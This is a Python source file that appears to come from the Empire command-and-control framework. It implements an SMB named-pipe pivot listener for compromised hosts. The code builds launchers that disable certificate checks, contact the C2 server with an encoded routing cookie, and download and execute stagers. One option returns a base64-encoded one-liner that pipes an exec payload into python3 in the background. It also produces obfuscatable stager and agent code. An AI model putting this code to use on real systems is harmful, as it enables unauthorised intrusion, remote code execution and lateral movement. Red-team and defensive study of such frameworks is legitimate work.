import base64
import copy
import logging
import os
import random

from empire.server.common import helpers, packets, templating
from empire.server.common.empire import MainMenu
from empire.server.core.db.base import SessionLocal
from empire.server.utils import listener_util

LOG_NAME_PREFIX = __name__
log = logging.getLogger(__name__)


class Listener:
    def __init__(self, mainMenu: MainMenu):
        self.info = {
            "Name": "smb_pivot",
            "Authors": [
                {
                    "Name": "Anthony Rose",
                    "Handle": "@Cx01N",
                    "Link": "https://twitter.com/Cx01N_",
                }
            ],
            "Description": ("Internal redirector listener using SMB."),
            "Category": ("peer_to_peer"),
            "Comments": [],
            "Software": "",
            "Techniques": [],
            "Tactics": [],
        }

        # any options needed by the stager, settable during runtime
        self.options = {
            # format:
            #   value_name : {description, required, default_value}
            "Name": {
                "Description": "Name for the listener.",
                "Required": True,
                "Value": "smb",
            },
            "Agent": {
                "Description": "Agent to run SMB server on.",
                "Required": True,
                "Value": "",
            },
            "PipeName": {
                "Description": "Name of the pipe.",
                "Required": True,
                "Value": "empire_pipe",
            },
        }

        # required:
        self.mainMenu = mainMenu
        self.threads = {}  # used to keep track of any threaded instances of this server
        self.host_address = None
        self.instance_log = log

    def default_response(self):
        """
        If there's a default response expected from the server that the client needs to ignore,
        (i.e. a default HTTP page), put the generation here.
        """
        self.instance_log.info("default_response() not implemented for pivot listeners")
        return b""

    def validate_options(self) -> tuple[bool, str | None]:
        """
        Validate all options for this listener.
        """
        return True, None

    def generate_launcher(
        self,
        encode=True,
        obfuscate=False,
        obfuscation_command="",
        user_agent="default",
        proxy="default",
        proxy_creds="default",
        stager_retries="0",
        language=None,
        safe_checks="",
        listener_name=None,
        bypasses: list[str] | None = None,
    ):
        """
        Generate a basic launcher for the specified listener.
        """
        bypasses = [] if bypasses is None else bypasses

        if not language:
            log.error("listeners/template generate_launcher(): no language specified!")
            return None

        stagingKey = self.options["StagingKey"]["Value"]
        profile = self.options["DefaultProfile"]["Value"]
        uris = list(profile.split("|")[0].split(","))
        stage0 = random.choice(uris)
        customHeaders = profile.split("|")[2:]

        if language.startswith("powershell"):
            log.error(
                "Invalid language specification, only 'ironpython' is current supported for this module."
            )
            return None

        if language in ["ironpython"]:
            launcherBase = "import sys;"
            if "https" in self.host_address:
                # monkey patch ssl woohooo
                launcherBase += "import ssl;\nif hasattr(ssl, '_create_unverified_context'):ssl._create_default_https_context = ssl._create_unverified_context;\n"

            try:
                if safe_checks.lower() == "true":
                    launcherBase += listener_util.python_safe_checks()
            except Exception as e:
                p = f"{listener_name}: Error setting LittleSnitch in stager: {e!s}"
                log.error(p, exc_info=True)

            if user_agent.lower() == "default":
                profile = self.options["DefaultProfile"]["Value"]
                user_agent = profile.split("|")[1]

            launcherBase += "import urllib.request;\n"
            launcherBase += f"UA='{user_agent}';"
            launcherBase += (
                f"server='{self.host_address}';t='{stage0}';hop='{listener_name}';"
            )

            # prebuild the request routing packet for the launcher
            routingPacket = packets.build_routing_packet(
                stagingKey,
                sessionID="00000000",
                language="PYTHON",
                meta="STAGE0",
                additional="None",
                encData="",
            )
            b64RoutingPacket = base64.b64encode(routingPacket).decode("utf-8")

            launcherBase += "req=urllib.request.Request(server+t);\n"
            # add the routing packet to a cookie
            launcherBase += "req.add_header('User-Agent',UA);\n"
            launcherBase += (
                f"req.add_header('Cookie',\"session={b64RoutingPacket}\");\n"
            )
            launcherBase += "req.add_header('Hop-Name', hop);\n"

            # Add custom headers if any
            if customHeaders != []:
                for header in customHeaders:
                    headerKey = header.split(":")[0]
                    headerValue = header.split(":")[1]
                    # launcherBase += ",\"%s\":\"%s\"" % (headerKey, headerValue)
                    launcherBase += f'req.add_header("{headerKey}","{headerValue}");\n'

            if proxy.lower() != "none":
                if proxy.lower() == "default":
                    launcherBase += "proxy = urllib.request.ProxyHandler();\n"
                else:
                    proto = proxy.split(":")[0]
                    launcherBase += (
                        "proxy = urllib.request.ProxyHandler({'"
                        + proto
                        + "':'"
                        + proxy
                        + "'});\n"
                    )

                if proxy_creds != "none":
                    if proxy_creds == "default":
                        launcherBase += "o = urllib.request.build_opener(proxy);\n"
                    else:
                        launcherBase += "proxy_auth_handler = urllib.request.ProxyBasicAuthHandler();\n"
                        username = proxy_creds.split(":")[0]
                        password = proxy_creds.split(":")[1]
                        launcherBase += (
                            "proxy_auth_handler.add_password(None,'"
                            + proxy
                            + "','"
                            + username
                            + "','"
                            + password
                            + "');\n"
                        )
                        launcherBase += "o = urllib.request.build_opener(proxy, proxy_auth_handler);\n"
                else:
                    launcherBase += "o = urllib.request.build_opener(proxy);\n"
            else:
                launcherBase += "o = urllib.request.build_opener();\n"

            # install proxy and creds globally, so they can be used with urlopen.
            launcherBase += "urllib.request.install_opener(o);\n"
            launcherBase += "a=urllib.request.urlopen(req).read();\n"

            # download the stager and extract the IV
            launcherBase += listener_util.python_extract_stager(stagingKey)

            if obfuscate:
                launcherBase = self.mainMenu.obfuscationv2.python_obfuscate(
                    launcherBase
                )

            if encode:
                launchEncoded = base64.b64encode(launcherBase.encode("UTF-8")).decode(
                    "UTF-8"
                )
                return f"echo \"import sys,base64,warnings;warnings.filterwarnings('ignore');exec(base64.b64decode('{launchEncoded}'));\" | python3 &"
            return launcherBase

        log.error(
            "listeners/template generate_launcher(): invalid language specification: only 'powershell' and 'python' are current supported for this module."
        )
        return None

    def generate_stager(
        self,
        listenerOptions,
        encode=False,
        encrypt=True,
        obfuscate=False,
        obfuscation_command="",
        language=None,
    ):
        """
        If you want to support staging for the listener module, generate_stager must be
        implemented to return the stage1 key-negotiation stager code.
        """
        if not language:
            log.error("generate_stager(): no language specified!")
            return None

        pipe_name = listenerOptions["PipeName"]["Value"]
        profile = listenerOptions["DefaultProfile"]["Value"]
        uris = [a.strip("/") for a in profile.split("|")[0].split(",")]
        stagingKey = listenerOptions["StagingKey"]["Value"]
        workingHours = listenerOptions["WorkingHours"]["Value"]
        killDate = listenerOptions["KillDate"]["Value"]

        # select some random URIs for staging from the main profile
        stage1 = random.choice(uris)
        stage2 = random.choice(uris)

        if language.lower() == "powershell":
            log.error(
                "Invalid language specification, only 'ironpython' is current supported for this module."
            )
            return None

        if language.lower() == "python":
            template_path = [
                os.path.join(self.mainMenu.installPath, "/data/agent/stagers"),
                os.path.join(self.mainMenu.installPath, "./data/agent/stagers"),
            ]

            eng = templating.TemplateEngine(template_path)
            template = eng.get_template("smb/smb.py")

            template_options = {
                "working_hours": workingHours,
                "kill_date": killDate,
                "staging_key": stagingKey,
                "profile": profile,
                "stage_1": stage1,
                "stage_2": stage2,
                "host": self.host_address,
                "pipe_name": pipe_name,
            }
            stager = template.render(template_options)

            if obfuscate:
                stager = self.mainMenu.obfuscationv2.python_obfuscate(stager)

            # base64 encode the stager and return it
            if encode:
                return base64.b64encode(stager)

            # otherwise return the standard stager
            return stager

        log.error(
            "listeners/http generate_stager(): invalid language specification, only 'powershell' and 'python' are currently supported for this module."
        )
        return None

    def generate_agent(
        self,
        listenerOptions,
        language=None,
        obfuscate=False,
        obfuscation_command="",
        version="",
    ):
        """
        If you want to support staging for the listener module, generate_agent must be
        implemented to return the actual staged agent code.
        """
        if not language:
            log.error("listeners/http generate_agent(): no language specified!")
            return None

        language = language.lower()
        delay = listenerOptions["DefaultDelay"]["Value"]
        jitter = listenerOptions["DefaultJitter"]["Value"]
        profile = listenerOptions["DefaultProfile"]["Value"]
        listenerOptions["DefaultLostLimit"]["Value"]
        listenerOptions["KillDate"]["Value"]
        listenerOptions["WorkingHours"]["Value"]
        b64DefaultResponse = self.b64DefaultResponse

        if language == "powershell":
            log.error(
                "Invalid language specification, only 'ironpython' is current supported for this module."
            )
            return None

        if language == "python":
            with open(
                self.mainMenu.installPath + "/data/agent/ironpython_agent.py"
            ) as f:
                code = f.read()

            # strip out comments and blank lines
            code = helpers.strip_python_comments(code)

            # patch in the delay, jitter, lost limit, and comms profile
            code = code.replace("delay=60", f"delay={delay}")
            code = code.replace("jitter=0.0", f"jitter={jitter}")
            code = code.replace(
                'profile = "/admin/get.php,/news.php,/login/process.php|Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko"',
                f'profile = "{profile}"',
            )

            code = code.replace(
                'self.defaultResponse = base64.b64decode("")',
                f"self.defaultResponse = base64.b64decode({b64DefaultResponse})",
            )

            if obfuscate:
                code = self.mainMenu.obfuscationv2.python_obfuscate(code)

            return code

        log.error(
            "Invalid language specification, only 'ironpython' is current supported for this module."
        )
        return None

    def generate_comms(self, listenerOptions, language=None):
        """
        Generate just the agent communication code block needed for communications with this listener.
        This is so agents can easily be dynamically updated for the new listener.

        This should be implemented for the module.
        """
        pipe_name = listenerOptions["PipeName"]["Value"]

        if not language:
            log.error("generate_comms(): no language specified!")
            return None

        if language.lower() == "powershell":
            log.error(
                "Invalid language specification, only 'ironpython' is current supported for this module."
            )
            return None

        if language.lower() == "python":
            template_path = [
                os.path.join(self.mainMenu.installPath, "/data/agent/stagers"),
                os.path.join(self.mainMenu.installPath, "./data/agent/stagers"),
            ]
            eng = templating.TemplateEngine(template_path)
            template = eng.get_template("smb/comms.py")

            template_options = {
                "host": self.host_address,
                "pipe_name": pipe_name,
            }

            return template.render(template_options)

        log.error(
            "Invalid language specification, only 'ironpython' is current supported for this module."
        )
        return None

    def start(self):
        """
        If a server component needs to be started, implement the kick off logic
        here and the actual server code in another function to facilitate threading
        (i.e. start_server() in the http listener).
        """
        try:
            name = self.options["Name"]["Value"]
            tempOptions = copy.deepcopy(self.options)

            with SessionLocal.begin() as db:
                agent = self.mainMenu.agentsv2.get_by_id(
                    db, self.options["Agent"]["Value"]
                )

                if not agent:
                    return None

                self.mainMenu.agenttasksv2.create_task_smb(
                    db, agent, name + "|" + self.options["PipeName"]["Value"]
                )
                self.parent_agent = agent.session_id
                self.parent_listener_name = agent.listener

                log.info(
                    f"{self.options['Agent']['Value']}: SMB pivot server task request send to agent"
                )

                self.parent_listener = self.mainMenu.listenersv2.get_by_name(
                    db, self.parent_listener_name
                )

                if not self.parent_listener:
                    log.error("Parent listener not found")
                    return False

                if self.parent_listener.module not in ["http", "smb"]:
                    log.error("Parent listener must be a http listener")
                    return False

                self.options = copy.deepcopy(self.parent_listener.options)
                self.options["Name"]["Value"] = name
                self.options["Agent"] = tempOptions["Agent"]
                self.options["PipeName"] = tempOptions["PipeName"]

                # If default response exists on a parent then use it, else grab it from the primary listener
                active_listener = self.mainMenu.listenersv2.get_active_listener_by_name(
                    self.parent_listener.name
                )
                try:
                    self.b64DefaultResponse = active_listener.b64DefaultResponse
                except AttributeError:
                    self.b64DefaultResponse = base64.b64encode(
                        self.mainMenu.listenersv2.get_active_listener_by_name(
                            self.parent_listener.name
                        )
                        .default_response()
                        .encode("UTF-8")
                    )
                return True

        except Exception:
            return False

    def shutdown(self):
        """
        If a server component was started, implement the logic that kills the particular
        named listener here.
        """
        pass
